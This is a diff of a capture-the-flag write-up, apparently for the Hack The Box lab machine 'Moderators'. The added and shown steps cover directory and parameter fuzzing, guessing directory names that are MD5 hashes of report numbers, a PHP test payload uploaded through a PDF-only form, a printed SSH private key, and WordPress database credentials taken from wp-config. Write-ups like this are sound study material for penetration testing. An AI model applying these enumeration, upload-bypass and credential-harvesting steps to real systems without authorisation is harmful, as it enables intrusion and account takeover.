@@ -1,3 +1,11 @@
+![image](https://user-images.githubusercontent.com/105310322/195453417-4c83a7a0-f28d-4e52-8dac-4e01ca07a364.png)
+
+### Tools: Feroxbuster, ffuf, python, chisel, vbox
+
+### Vulnerabilities: PDF-PHP Reverse Shell, Wordpress LFI, SQL replace creds, VBOX cracking
+
+Nmap reveals ssh and a webpage are open.
+
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.99.138     
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-07 11:29 CDT
@@ -19,6 +27,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 674.55 seconds
 zsh: segmentation fault  nmap -A -p- -T4 -Pn 10.129.99.138
 ```
+
+Feroxbuster tells us this webpage has an uploads directory which means there is a possible vulnerabilty there as well an email page.
+
+I checked the email page for a bit but did not find anything.
 
 ```console
 └─$ feroxbuster -u http://10.129.99.138 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
@@ -59,6 +71,14 @@ Scanning: http://10.129.99.138/images/blog
 Scanning: http://10.129.99.138/logs/uploads
 ```
 
+However the blog section of the webpage seemed very interesting and it was actually hiding more reports than what was shown.
+
+![image](https://user-images.githubusercontent.com/105310322/195454870-6cb78e65-7c11-4414-8c77-b1e2e38ed01d.png)
+
+
+By fuzzing we can find the rest of the reports and take a look at them.
+
+
 ```console
 └─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://10.129.99.138/reports.php?report=FUZZ -v -fs 0 -fw 3091 -fc 302 -c -s
 2589
@@ -68,6 +88,10 @@ Scanning: http://10.129.99.138/logs/uploads
 8121
 9798
 ```
+By checking out http://Moderators.htb/reports.php?report=9798
+
+Inside report 9798 we find a directory from the url that takes us to a page, However this page is blank.
+
 
 ```
  Report #9798
@@ -83,7 +107,7 @@ Scanning: http://10.129.99.138/logs/uploads
 [+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
 ```
 
-Running feroxbuster reveals that the there is a logs.pdf in the directory.
+Running feroxbuster reveals that the there is a logs.pdf in the directory. This log was not important and only says "Logs removed"
 
 ```
 └─$ feroxbuster -u http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
@@ -95,7 +119,11 @@ Running feroxbuster reveals that the there is a logs.pdf in the directory.
 Scanning: http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed
 ```
 
-In fact each of these report numbers are actually the the directory hashes. If you run feroxbuster on all of these it will show that each of them have logs.pdf files.
+In fact each of these report numbers are actually the directory hashes. 
+
+By taking the original log hash ```e21cece511f43a5cb18d4932429915ed``` and running a quick hash cracker we get back 9798. So if we take each of the these logs and convert them to an MD5 hash we can get the directories to check the other logs.pdf that each report holds.
+
+Note: If you run feroxbuster on all of these it will show that each of them have logs.pdf files.
 
 ```
 e21cece511f43a5cb18d4932429915ed=9798
@@ -121,7 +149,6 @@ Logs
 [02/07/2021] Approval pending......
 ```
 
-
 ![image](https://user-images.githubusercontent.com/105310322/194651486-d61e8bfb-b8b7-4b94-a34a-09c5a2cd03c3.png)
 
 However it only allows us to upload pdf files and we cannot get a reverse shell through a pdf.
@@ -138,9 +165,10 @@ Note2: Also be sure to rename the file if you fail since the files do not get ov
 ![image](https://user-images.githubusercontent.com/105310322/194648359-03a0333b-00f3-467f-9306-0353c31b93fe.png)
 
 
-
+```
 <?php
 phpinfo();
+```
 
 ![image](https://user-images.githubusercontent.com/105310322/194648168-1e62ad99-1e4f-4fe7-993b-7bdf3a2a6a34.png)
 
@@ -266,14 +294,7 @@ cat user.txt
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357Lf╔══════════╣ Analyzing Wordpress Files (limit 70)
--rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
-define( 'DB_NAME', 'wordpress' );
-define( 'DB_USER', 'wordpressuser' );
-define( 'DB_PASSWORD', 'wordpresspassword123!!' );
-define( 'DB_HOST', 'localhost' );
-
-XjhIuTG4qkX6eY4iCw7EBGKwaEryn
+NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn
 ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM
 ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa
 QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV
@@ -311,6 +332,15 @@ J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 ```
 # John Privilege Escalation
+
+```console
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpressuser' );
+define( 'DB_PASSWORD', 'wordpresspassword123!!' );
+define( 'DB_HOST', 'localhost' );
+```
 
 ```console
 lexi@moderators:/tmp$ mysql -u wordpressuser -p
